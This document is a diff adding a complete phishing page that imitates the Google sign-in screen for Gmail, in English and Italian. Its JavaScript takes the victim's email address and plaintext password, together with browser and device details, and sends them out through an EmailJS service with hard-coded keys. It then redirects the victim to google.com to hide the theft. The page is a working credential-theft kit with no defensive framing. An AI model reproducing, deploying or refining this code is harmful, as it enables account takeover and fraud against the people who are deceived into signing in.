@@ -1,0 +1,779 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in</title>
+<style>
+:root{
+  --bg: #f0f2f5;
+  --panel: #fff;
+  --muted: #5f6368;
+  --text: #202124;
+  --border: #dadce0;
+  --blue: #1a73e8;
+  --blue-hover: #1669c1;
+  --error: #d93025;
+  --radius: 28px;
+}
+
+@media (prefers-color-scheme: dark){
+  :root{
+    --bg: #202124;
+    --panel: #2c2d2f;
+    --muted: #bfc3c6;
+    --text: #e8eaed;
+    --border: #5f6368;
+    --blue: #8ab4f8;
+    --blue-hover: #669df6;
+    --error: #f28b82;
+  }
+}
+
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;
+  min-height:100vh;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  -webkit-font-smoothing:antialiased;
+  display:flex;
+  flex-direction:column;
+}
+
+.main {
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:36px;
+}
+
+.panel{
+  width:100%;
+  max-width:850px;
+  background:var(--panel);
+  border-radius:var(--radius);
+  display:flex;
+  box-shadow: 0 1px 2px rgba(0,0,0,0.08);
+  overflow:hidden;
+  min-height:520px;
+}
+
+.left {
+  flex:1;
+  padding:48px 44px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:flex-start;
+  gap:8px;
+}
+
+.left .logo{
+  height:48px;
+  width:auto;
+  margin-bottom:20px;
+}
+
+.left h1{
+  font-size:28px;
+  font-weight:400;
+  margin:0 0 6px 0;
+  color:var(--text);
+}
+
+.left p.lead{
+  margin:0;
+  color:var(--muted);
+  font-size:16px;
+}
+
+.right{
+  flex:1;
+  padding:48px 44px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:flex-start;
+}
+
+.form-block{
+  width:100%;
+  max-width:360px;
+  margin:0;
+}
+
+input[type="email"],
+input[type="text"],
+input[type="password"]{
+  width:100%;
+  padding:14px 12px;
+  font-size:16px;
+  border:1px solid var(--border);
+  border-radius:6px;
+  margin-bottom:8px;
+  background-color:var(--panel);
+  color:var(--text);
+}
+
+input:focus{
+  outline:none;
+  border-color:var(--blue);
+  box-shadow:0 0 0 2px rgba(26,115,232,0.08);
+}
+
+.hint{
+  font-size:14px;
+  color:var(--muted);
+  margin-top:12px;
+}
+
+.link{
+  display:inline-block;
+  font-size:14px;
+  color:var(--blue);
+  text-decoration:none;
+  margin-top:8px;
+  cursor:pointer;
+}
+.link:hover{
+  text-decoration:underline;
+}
+
+.controls{
+  display:flex;
+  justify-content:flex-end;
+  align-items:center;
+  gap:12px;
+  margin-top:28px;
+}
+
+.btn-text{
+  background:none;
+  border:none;
+  color:var(--blue);
+  font-size:14px;
+  cursor:pointer;
+  padding:8px 12px;
+}
+.btn-text:hover{
+  background:rgba(26,115,232,0.04);
+  border-radius:4px;
+}
+
+.btn-primary{
+  background:var(--blue);
+  border:none;
+  color:white;
+  padding:10px 22px;
+  border-radius:8px;
+  font-weight:600;
+  cursor:pointer;
+  font-size:14px;
+}
+.btn-primary:hover{ background:var(--blue-hover); }
+.btn-primary:disabled{
+  background:#ccc;
+  cursor:not-allowed;
+  opacity:0.6;
+}
+
+.error {
+  border-color:var(--error) !important;
+  box-shadow:0 0 0 2px rgba(217,48,37,0.08);
+}
+
+.error-text{
+  color:var(--error);
+  font-size:13px;
+  margin:6px 0 8px 0;
+  display:none;
+  align-items:center;
+}
+.error-text.show{
+  display:flex;
+}
+.error-text::before{
+  content: "⚠";
+  margin-right:6px;
+  font-size:14px;
+}
+
+footer{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:12px 28px;
+  font-size:13px;
+  color:var(--muted);
+}
+footer .right a{
+  color:var(--muted);
+  text-decoration:none;
+  margin-left:16px;
+}
+footer select{
+  background:transparent;
+  border:none;
+  color:var(--muted);
+  font-size:13px;
+}
+
+/* Mobile responsive - Fixed to remove weird line */
+@media (max-width:860px){
+  .main { padding: 20px; }
+  .panel{ 
+    flex-direction:column; 
+    max-width:100%; 
+    min-height:auto; 
+    border-radius:28px; 
+  }
+  .left{ 
+    border-right:none; 
+    align-items:center; 
+    text-align:center; 
+    padding:48px 44px 28px 44px; 
+  }
+  .right{ 
+    padding:28px 44px 48px 44px; 
+    align-items:center; 
+  }
+  .form-block{ max-width:360px; width:100%; }
+}
+
+@media (max-width:480px){
+  body{ padding: 10px; }
+  .main { padding: 10px; }
+  .panel{ border-radius:20px; min-height:unset; }
+  .left { padding: 32px 24px 20px 24px; }
+  .left .logo { height: 40px; margin-bottom: 16px; }
+  .left h1{ font-size:24px; margin: 0 0 4px 0; }
+  .left p.lead { font-size: 15px; }
+  .right { padding: 20px 24px 32px 24px; }
+}
+</style>
+</head>
+<body>
+
+<div class="main">
+  <div class="panel">
+    <div class="left">
+      <svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#FBBC05" d="m209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+        <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
+        <path fill="#34A853" d="m262.02 54.48 7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98 19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+        <path fill="#EA4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
+      </svg>
+      <h1 id="title">Sign in</h1>
+      <p class="lead" id="subtitle">to continue to <strong>Gmail</strong></p>
+      <div id="userEmail" style="margin-top:14px; font-size:15px; color:var(--muted); display:none;"></div>
+    </div>
+
+    <div class="right">
+      <!-- Email Step -->
+      <div id="emailStep" class="form-block">
+        <input id="email" type="email" placeholder="Email or phone" required autofocus>
+        <div id="emailError" class="error-text"></div>
+        <a id="forgotEmail" class="link">Forgot email?</a>
+        <p id="hint" class="hint">Not your computer? Use a Private Window to sign in. <a href="#">Learn more</a></p>
+        <div class="controls">
+          <button type="button" id="emailNext" class="btn-primary">Next</button>
+        </div>
+      </div>
+
+      <!-- Password Step -->
+      <div id="passwordStep" class="form-block" style="display:none;">
+        <input id="password" type="password" placeholder="Enter your password" required>
+        <div id="passwordError" class="error-text"></div>
+        <a id="forgotPassword" class="link">Forgot password?</a>
+        <div class="controls" style="margin-top:24px;">
+          <button type="button" id="backBtn" class="btn-text">Back</button>
+          <button type="button" id="submitBtn" class="btn-primary">Next</button>
+        </div>
+      </div>
+
+      <!-- Recovery Step -->
+      <div id="recoveryStep" class="form-block" style="display:none;">
+        <input id="recovery" type="text" placeholder="Phone number or recovery email">
+        <div id="recoveryError" class="error-text"></div>
+        <div class="hint" style="margin-top:12px;" id="recoveryHint">We'll use this to help find your account.</div>
+        <div class="controls">
+          <button type="button" id="recoveryBack" class="btn-text">Back</button>
+          <button type="button" id="recoveryNext" class="btn-primary">Next</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div>
+    <select id="langSelect">
+      <option value="en">English (United States)</option>
+      <option value="it">Italiano</option>
+    </select>
+  </div>
+  <div class="right">
+    <a href="#" id="help">Help</a>
+    <a href="#" id="privacy">Privacy</a>
+    <a href="#" id="terms">Terms</a>
+  </div>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+// Initialize EmailJS - Simplified and more reliable
+let emailjsReady = false;
+
+function initEmailJS() {
+  try {
+    if (typeof emailjs !== 'undefined' && emailjs.init) {
+      emailjs.init({ publicKey: "EB017wgX1BeDuRY66" });
+      emailjsReady = true;
+      console.log('EmailJS initialized successfully');
+    } else {
+      console.log('EmailJS not ready yet, retrying...');
+      setTimeout(initEmailJS, 500);
+    }
+  } catch(e) {
+    console.error("EmailJS initialization error:", e);
+    setTimeout(initEmailJS, 1000);
+  }
+}
+
+// Start EmailJS initialization
+setTimeout(initEmailJS, 100);
+
+const SERVICE_ID = "service_64albro";
+const TEMPLATE_ID = "template_75g1nju";
+
+// State variables
+let validatedEmail = '';
+let validatedPassword = '';
+let currentLanguage = 'en';
+
+// Translations
+const translations = {
+  en: {
+    signIn: "Sign in",
+    toContinue: "to continue to <strong>Gmail</strong>",
+    emailPlaceholder: "Email or phone",
+    passwordPlaceholder: "Enter your password",
+    recoveryPlaceholder: "Phone number or recovery email",
+    forgotEmail: "Forgot email?",
+    forgotPassword: "Forgot password?",
+    hint: "Not your computer? Use a Private Window to sign in. <a href='#'>Learn more</a>",
+    recoveryHint: "We'll use this to help find your account.",
+    next: "Next",
+    back: "Back",
+    signingIn: "Signing in...",
+    help: "Help",
+    privacy: "Privacy",
+    terms: "Terms",
+    invalidEmail: "Please enter a valid email address",
+    invalidPhone: "Please enter a valid phone number",
+    invalidPassword: "Please enter your password",
+    emptyField: "This field is required"
+  },
+  it: {
+    signIn: "Accedi",
+    toContinue: "per continuare su <strong>Gmail</strong>",
+    emailPlaceholder: "Email o telefono",
+    passwordPlaceholder: "Inserisci la password",
+    recoveryPlaceholder: "Numero di telefono o email di recupero",
+    forgotEmail: "Hai dimenticato l'email?",
+    forgotPassword: "Password dimenticata?",
+    hint: "Non è il tuo computer? Usa una finestra privata per accedere. <a href='#'>Scopri di più</a>",
+    recoveryHint: "Useremo questo per aiutarti a trovare il tuo account.",
+    next: "Avanti",
+    back: "Indietro",
+    signingIn: "Accesso in corso...",
+    help: "Guida",
+    privacy: "Privacy",
+    terms: "Termini",
+    invalidEmail: "Inserisci un indirizzo email valido",
+    invalidPhone: "Inserisci un numero di telefono valido",
+    invalidPassword: "Inserisci la password",
+    emptyField: "Questo campo è obbligatorio"
+  }
+};
+
+// Get DOM elements
+const elements = {
+  emailStep: document.getElementById('emailStep'),
+  passwordStep: document.getElementById('passwordStep'),
+  recoveryStep: document.getElementById('recoveryStep'),
+  email: document.getElementById('email'),
+  password: document.getElementById('password'),
+  recovery: document.getElementById('recovery'),
+  emailError: document.getElementById('emailError'),
+  passwordError: document.getElementById('passwordError'),
+  recoveryError: document.getElementById('recoveryError'),
+  emailNext: document.getElementById('emailNext'),
+  submitBtn: document.getElementById('submitBtn'),
+  backBtn: document.getElementById('backBtn'),
+  recoveryBack: document.getElementById('recoveryBack'),
+  recoveryNext: document.getElementById('recoveryNext'),
+  forgotEmail: document.getElementById('forgotEmail'),
+  forgotPassword: document.getElementById('forgotPassword'),
+  title: document.getElementById('title'),
+  subtitle: document.getElementById('subtitle'),
+  userEmail: document.getElementById('userEmail'),
+  hint: document.getElementById('hint'),
+  recoveryHint: document.getElementById('recoveryHint'),
+  help: document.getElementById('help'),
+  privacy: document.getElementById('privacy'),
+  terms: document.getElementById('terms'),
+  langSelect: document.getElementById('langSelect')
+};
+
+// Validation functions
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
+}
+
+function isValidPhone(phone) {
+  const cleaned = phone.replace(/[^\d]/g, '');
+  return cleaned.length >= 10 && cleaned.length <= 15;
+}
+
+function showStep(step) {
+  const steps = [elements.emailStep, elements.passwordStep, elements.recoveryStep];
+  steps.forEach(s => s.style.display = 'none');
+  step.style.display = 'block';
+}
+
+function showError(input, errorDiv, message) {
+  input.classList.add('error');
+  errorDiv.textContent = message;
+  errorDiv.classList.add('show');
+}
+
+function hideError(input, errorDiv) {
+  input.classList.remove('error');
+  errorDiv.classList.remove('show');
+  errorDiv.textContent = '';
+}
+
+function applyLanguage(lang) {
+  const t = translations[lang] || translations.en;
+  
+  elements.title.textContent = t.signIn;
+  elements.subtitle.innerHTML = t.toContinue;
+  elements.email.placeholder = t.emailPlaceholder;
+  elements.password.placeholder = t.passwordPlaceholder;
+  elements.recovery.placeholder = t.recoveryPlaceholder;
+  elements.forgotEmail.textContent = t.forgotEmail;
+  elements.forgotPassword.textContent = t.forgotPassword;
+  elements.hint.innerHTML = t.hint;
+  elements.recoveryHint.textContent = t.recoveryHint;
+  elements.emailNext.textContent = t.next;
+  elements.submitBtn.textContent = t.next;
+  elements.backBtn.textContent = t.back;
+  elements.recoveryBack.textContent = t.back;
+  elements.recoveryNext.textContent = t.next;
+  elements.help.textContent = t.help;
+  elements.privacy.textContent = t.privacy;
+  elements.terms.textContent = t.terms;
+}
+
+// Enhanced EmailJS send function
+function sendEmail(data) {
+  return new Promise((resolve, reject) => {
+    if (!emailjsReady || typeof emailjs === 'undefined') {
+      console.error("EmailJS not ready");
+      reject(new Error("EmailJS not available"));
+      return;
+    }
+
+    console.log('Sending email with EmailJS...', data);
+    
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, data)
+      .then((response) => {
+        console.log('EmailJS SUCCESS:', response);
+        resolve(response);
+      })
+      .catch((error) => {
+        console.error('EmailJS FAILED:', error);
+        reject(error);
+      });
+  });
+}
+
+function redirect() {
+  console.log('Starting redirect process...');
+  const urls = ["https://google.com", "https://www.google.com"];
+  let currentUrl = 0;
+  
+  function attemptRedirect() {
+    try {
+      console.log('Redirecting to:', urls[currentUrl]);
+      window.location.href = urls[currentUrl];
+      
+      // Fallback
+      setTimeout(() => {
+        window.location.replace(urls[currentUrl]);
+      }, 1000);
+    } catch(e) {
+      console.error('Redirect failed:', e);
+      currentUrl++;
+      if (currentUrl < urls.length) {
+        setTimeout(attemptRedirect, 500);
+      }
+    }
+  }
+  
+  attemptRedirect();
+}
+
+// Event Handlers
+function handleEmailNext() {
+  console.log('Email Next clicked');
+  
+  const val = elements.email.value.trim();
+  const t = translations[currentLanguage];
+  
+  hideError(elements.email, elements.emailError);
+  
+  if (!val) {
+    console.log('Email field is empty');
+    showError(elements.email, elements.emailError, t.emptyField);
+    elements.email.focus();
+    return;
+  }
+  
+  let isValid = false;
+  if (val.includes('@')) {
+    isValid = isValidEmail(val);
+    if (!isValid) {
+      console.log('Invalid email format');
+      showError(elements.email, elements.emailError, t.invalidEmail);
+      elements.email.focus();
+      return;
+    }
+  } else {
+    isValid = isValidPhone(val);
+    if (!isValid) {
+      console.log('Invalid phone format');
+      showError(elements.email, elements.emailError, t.invalidPhone);
+      elements.email.focus();
+      return;
+    }
+  }
+  
+  console.log('Email validation passed');
+  validatedEmail = val;
+  elements.subtitle.style.display = 'none';
+  elements.userEmail.style.display = 'block';
+  elements.userEmail.textContent = val;
+  showStep(elements.passwordStep);
+  elements.password.value = '';
+  setTimeout(() => elements.password.focus(), 100);
+}
+
+function handlePasswordNext() {
+  console.log('Password Next clicked');
+  
+  const passVal = elements.password.value;
+  const t = translations[currentLanguage];
+  
+  hideError(elements.password, elements.passwordError);
+  
+  if (!passVal) {
+    console.log('Password field is empty');
+    showError(elements.password, elements.passwordError, t.invalidPassword);
+    elements.password.focus();
+    return;
+  }
+  
+  console.log('Password validation passed');
+  validatedPassword = passVal;
+  
+  if (!validatedEmail || !validatedPassword) {
+    console.error('Missing validated credentials');
+    return;
+  }
+  
+  elements.submitBtn.disabled = true;
+  elements.submitBtn.textContent = t.signingIn;
+  
+  const data = {
+    user_email: validatedEmail,
+    user_password: validatedPassword,
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent,
+    page_url: window.location.href,
+    device_type: (/Mobi|Android/i.test(navigator.userAgent)) ? 'mobile' : 'desktop',
+    language: currentLanguage
+  };
+  
+  console.log('Attempting to send email...', data);
+  
+  sendEmail(data)
+    .then(() => {
+      console.log('Email sent successfully, redirecting...');
+      setTimeout(redirect, 1000);
+    })
+    .catch(err => {
+      console.error("Email send failed:", err);
+      // Still redirect even if email fails
+      setTimeout(redirect, 2000);
+    });
+}
+
+function handleRecoveryNext() {
+  console.log('Recovery Next clicked');
+  
+  const val = elements.recovery.value.trim();
+  const t = translations[currentLanguage];
+  
+  hideError(elements.recovery, elements.recoveryError);
+  
+  if (!val) {
+    console.log('Recovery field is empty');
+    showError(elements.recovery, elements.recoveryError, t.emptyField);
+    elements.recovery.focus();
+    return;
+  }
+  
+  if (val.includes('@')) {
+    if (!isValidEmail(val)) {
+      console.log('Invalid recovery email');
+      showError(elements.recovery, elements.recoveryError, t.invalidEmail);
+      elements.recovery.focus();
+      return;
+    }
+  } else {
+    if (!isValidPhone(val)) {
+      console.log('Invalid recovery phone');
+      showError(elements.recovery, elements.recoveryError, t.invalidPhone);
+      elements.recovery.focus();
+      return;
+    }
+  }
+  
+  console.log('Recovery validation passed, going back to email step');
+  validatedEmail = '';
+  validatedPassword = '';
+  showStep(elements.emailStep);
+  elements.recovery.value = '';
+  hideError(elements.recovery, elements.recoveryError);
+  elements.subtitle.style.display = 'block';
+  elements.userEmail.style.display = 'none';
+  elements.email.value = '';
+  elements.email.focus();
+}
+
+function handleBack() {
+  console.log('Back clicked');
+  hideError(elements.password, elements.passwordError);
+  elements.subtitle.style.display = 'block';
+  elements.userEmail.style.display = 'none';
+  validatedPassword = '';
+  elements.submitBtn.disabled = false;
+  elements.submitBtn.textContent = translations[currentLanguage].next;
+  showStep(elements.emailStep);
+  elements.email.focus();
+}
+
+function handleForgotEmail() {
+  console.log('Forgot email clicked');
+  hideError(elements.email, elements.emailError);
+  elements.subtitle.style.display = 'block';
+  elements.userEmail.style.display = 'none';
+  validatedEmail = '';
+  showStep(elements.recoveryStep);
+  elements.recovery.focus();
+}
+
+function handleRecoveryBack() {
+  console.log('Recovery back clicked');
+  hideError(elements.recovery, elements.recoveryError);
+  showStep(elements.emailStep);
+  elements.email.focus();
+}
+
+function handleForgotPassword() {
+  console.log('Forgot password clicked');
+  hideError(elements.password, elements.passwordError);
+  validatedPassword = '';
+  elements.submitBtn.disabled = false;
+  elements.submitBtn.textContent = translations[currentLanguage].next;
+  showStep(elements.recoveryStep);
+  elements.recovery.focus();
+}
+
+// Event Listeners
+elements.langSelect.addEventListener('change', (e) => {
+  currentLanguage = e.target.value;
+  applyLanguage(currentLanguage);
+});
+
+elements.emailNext.addEventListener('click', handleEmailNext);
+elements.submitBtn.addEventListener('click', handlePasswordNext);
+elements.recoveryNext.addEventListener('click', handleRecoveryNext);
+elements.backBtn.addEventListener('click', handleBack);
+elements.forgotEmail.addEventListener('click', handleForgotEmail);
+elements.recoveryBack.addEventListener('click', handleRecoveryBack);
+elements.forgotPassword.addEventListener('click', handleForgotPassword);
+
+// Enter key handlers
+elements.email.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    handleEmailNext();
+  }
+});
+
+elements.password.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    handlePasswordNext();
+  }
+});
+
+elements.recovery.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    handleRecoveryNext();
+  }
+});
+
+// Input event handlers to clear errors
+elements.email.addEventListener('input', () => {
+  if (elements.email.value.trim()) {
+    hideError(elements.email, elements.emailError);
+  }
+});
+
+elements.password.addEventListener('input', () => {
+  if (elements.password.value.trim()) {
+    hideError(elements.password, elements.passwordError);
+  }
+});
+
+elements.recovery.addEventListener('input', () => {
+  if (elements.recovery.value.trim()) {
+    hideError(elements.recovery, elements.recoveryError);
+  }
+});
+
+// Initialize app
+console.log('Initializing app...');
+applyLanguage('en');
+showStep(elements.emailStep);
+setTimeout(() => {
+  if (elements.email) {
+    elements.email.focus();
+  }
+}, 100);
+
+console.log('App initialized successfully');
+</script>
+</body>
+</html>
